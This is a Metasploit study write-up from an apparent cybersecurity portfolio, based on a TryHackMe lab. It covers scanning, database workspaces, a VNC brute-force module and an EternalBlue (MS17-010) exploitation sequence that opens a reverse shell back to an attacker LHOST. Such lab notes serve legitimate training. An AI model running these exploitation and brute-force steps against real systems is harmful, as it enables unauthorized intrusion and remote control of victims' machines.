# Metasploit Exploitation
- 🔍 [Port Scanning](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#-port-scanning-with-metasploit)
- 🧠 [Metasploit Database Overview](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#-metasploit-database-overview)
- 🗂️ [Workspace Management](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#%EF%B8%8F-workspace-management)
- ✅ [DB Backend Commands](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#-database-search-example)
- 🕵️ [Common Services to Investigate](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#%EF%B8%8F-common-services-to-investigate)
- 🔍 [Vulnerability Scanning with Metasploit](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#-vulnerability-scanning-with-metasploit)
- 🎯 [Payload Selection](https://github.com/Dee-Techie/Cybersecurity-Portfolio/blob/main/Write-Ups/Metasploit-Exploitation.md#-payload-selection)


# 🔍 Port Scanning with Metasploit

Metasploit provides various modules to perform port and service discovery on target systems.

## 🔎 Finding Port Scanning Modules

Use the `search portscan` command to list relevant modules:
- `portscan/tcp`
- `portscan/syn`
- `portscan/xmas`
- `portscan/ack`
- `portscan/ftpbounce`
- `portscan/natpmp`
- `sap_router_portscanner`

Use modules by index or full path, e.g.:
```bash
use 5
# or
use auxiliary/scanner/portscan/tcp
```

## ⚙️ Common Options for Port Scan Modules

| Option       | Description                                                                 |
|--------------|-----------------------------------------------------------------------------|
| `RHOSTS`     | Target hosts or range                                                       |
| `PORTS`      | Ports to scan (e.g., 1–10000). Note: Not the same as Nmap’s default top 1000 |
| `THREADS`    | Number of concurrent hosts to scan                                          |
| `CONCURRENCY`| Number of ports per host to scan in parallel                                |
| `TIMEOUT`    | Timeout in milliseconds per connection                                      |
| `DELAY`      | Delay between connections                                                   |
| `JITTER`     | Random variation added to delay                                             |

## 🛰️ Using Nmap from Metasploit

Metasploit allows executing Nmap directly from `msfconsole`:

```bash
msf6 > nmap -sS 10.10.12.229
```

## 📡 UDP Scanning

Use `scanner/discovery/udp_sweep` for quick detection of common UDP services (e.g., DNS, NetBIOS).

## 📁 SMB Scanning

Modules like `smb_version` and `smb_enumshares` help detect OS version, share details, and configurations:

```bash
use auxiliary/scanner/smb/smb_version
run
```

## 🧠 Pro Tip

Don’t ignore “exotic” services like NetBIOS. Look for shared files and indicative system names (e.g., CORP-DC, SALES). Always explore available modules relevant to your target.

---

## 🔬 Practical Exercise:
Refer to the [link](https://wanderication.medium.com/metasploit-exploitation-scanning-tryhackme-ba3b969e7398)
- How many ports are open on the target system?
  - Method 1: Use Nmap <IP Address> </br>
  ![image](https://github.com/user-attachments/assets/340633d5-dabd-45d7-b3fe-02d98146bbb7)

  - Method 2: Use Metasploit (Follow the steps)
    ```bash
    msfconsole
    search portscan
    use 5
    show options
    set RHOST <machine_ip>
    run
    ```
    ![image](https://github.com/user-attachments/assets/3f10a699-fc19-4711-a7dd-784721c8d55f)
    ![image](https://github.com/user-attachments/assets/1ba9fe42-96f6-4617-84f2-6df6912fb293)

---

# 🧠 Metasploit Database Overview

## 🎯 Purpose
The Metasploit database helps manage multi-target environments efficiently, especially during real-world penetration testing engagements.

---

## 🛠️ Initialization (For Kali Linux or local setups)

> ✅ Already configured in the THM AttackBox.

1. **Start PostgreSQL**  
   ```bash
   systemctl start postgresql
   ```

2. **Initialize Metasploit DB**  
   ```bash
   sudo -u postgres msfdb init
   ```

3. **To Delete Existing DB**  
   ```bash
   sudo -u postgres msfdb delete
   ```

---

## 🔍 Verifying Database Connection

```bash
msfconsole
msf6 > db_status
[*] Connected to msf. Connection type: postgresql.
```

---

## 🗂️ Workspace Management

- **List Workspaces:**  
  ```bash
  workspace
  ```

- **Add New Workspace:**  
  ```bash
  workspace -a tryhackme
  ```

- **Switch Workspace:**  
  ```bash
  workspace tryhackme
  ```

- **Workspace Help:**  
  ```bash
  workspace -h
  ```

---

## 🧰 Database Backend Commands

| 📌 Command           | 📝 Description |
|------------------|-------------|
| `db_connect`      | Connect to data service |
| `db_nmap`         | Run Nmap & save results |
| `db_import`       | Import scan results |
| `db_export`       | Export DB contents |
| `hosts`           | List all discovered hosts |
| `services`        | List services per host |
| `loot`, `notes`, `vulns` | List respective items |
| `db_status`       | Show DB status |
| `workspace`       | Manage workspaces |

---

## 🚀 Example Workflow

1. **Run Nmap Scan (auto-saves results):**
   ```bash
   db_nmap -sV -p- 10.10.12.229
   ```

2. **View Hosts and Services:**
   ```bash
   hosts
   services
   ```

3. **Set RHOSTS from Saved Hosts:**
   ```bash
   use auxiliary/scanner/smb/smb_ms17_010
   hosts -R
   ```

4. **Verify Options:**
   ```bash
   show options
   ```

5. **Run Exploit:**
   ```bash
   run
   ```

---

## 🔎 Database Search Example

- **Search for NetBIOS Services:**
  ```bash
  services -S netbios
  ```

---

## 🕵️ Common Services to Investigate

| 💻 Service | 🔓 Potential |
|-----------|--------------|
| HTTP      | Web app vulnerabilities (e.g., SQLi, RCE) |
| FTP       | Anonymous login, file access |
| SMB       | Vulnerabilities like MS17-010 |
| SSH       | Weak/default credentials |
| RDP       | Vulnerable to BlueKeep or weak passwords |

---

# 🔍 Vulnerability Scanning with Metasploit

## 🍒 Low-Hanging Fruit
Metasploit helps identify easily exploitable vulnerabilities known as **low-hanging fruit**, potentially leading to high-level access like **root** or **administrator**.

---

## 🧠 Fingerprinting First
Effective vulnerability scanning in Metasploit depends on proper **target scanning** and **fingerprinting**.

- Example: Finding VNC services and using VNC scanner modules.
```bash
msf6 > use auxiliary/scanner/vnc/
```

Use the `info` command on modules to understand their functionality.

---

## 🔑 VNC Login Scanner Example
```bash
use auxiliary/scanner/vnc/vnc_login
info
```

- Checks for VNC password access using wordlists, usernames, and brute-force.
- Supports multiple protocol versions.

📝 Reference: [CVE-1999-0506](https://cvedetails.com/cve/CVE-1999-0506/)

---

## 💣 Exploiting Vulnerabilities

Metasploit includes thousands of modules:
```
2048 exploits - 1105 auxiliary - 344 post
562 payloads - 45 encoders - 10 nops - 7 evasion
```

- Use `search`, `info`, and `exploit` commands.
- Most exploits include a **default payload**, but you can list more using:
```bash
show payloads
```

---

## 🎯 Payload Selection

```bash
set payload generic/shell_reverse_tcp
show options
```

Example: EternalBlue (MS17-010)
- Requires setting LHOST for reverse connection:
```bash
set lhost 10.10.186.44
exploit
```

Successful exploitation opens a reverse shell:
```bash
[*] Command shell session 1 opened
C:\Windows\system32>
```

---

## 🧵 Session Management

- Background session: `CTRL+Z`
- Abort session: `CTRL+C`
- List sessions:
```bash
sessions
```

Example session:
```text
Id  Type     Info                                     Connection
1   shell    Windows 7 x64 shell                      10.10.186.44 -> 10.10.12.229
```

---

## 🛠️ Sessions Command Options

```bash
sessions -h
```

| Option | Description |
|--------|-------------|
| -i     | Interact with session |
| -k     | Kill session(s) |
| -l     | List active sessions |
| -n     | Name/rename session |
| -u     | Upgrade shell to Meterpreter |
| -s     | Run script/module on session |

Example:
```bash
sessions -i 1
```

---

⚠️ Some payloads may not work due to firewalls, AV, missing software, or system restrictions. Trial-and-error and re-checking `show options` is often needed.

---

🧑‍💻 With sessions, you can multitask, manage multiple targets, and exploit different vectors efficiently within Metasploit.

---



---
<sub>🔗 References & Resources:</sub>
- <sub>TryHackMe — Moniker Link | Cyber Security 101 (THM) [TryHackMe](https://tryhackme.com/room/monikerlink)</sub>
- <sub>https://wanderication.medium.com/metasploit-exploitation-scanning-tryhackme-ba3b969e7398</sub>
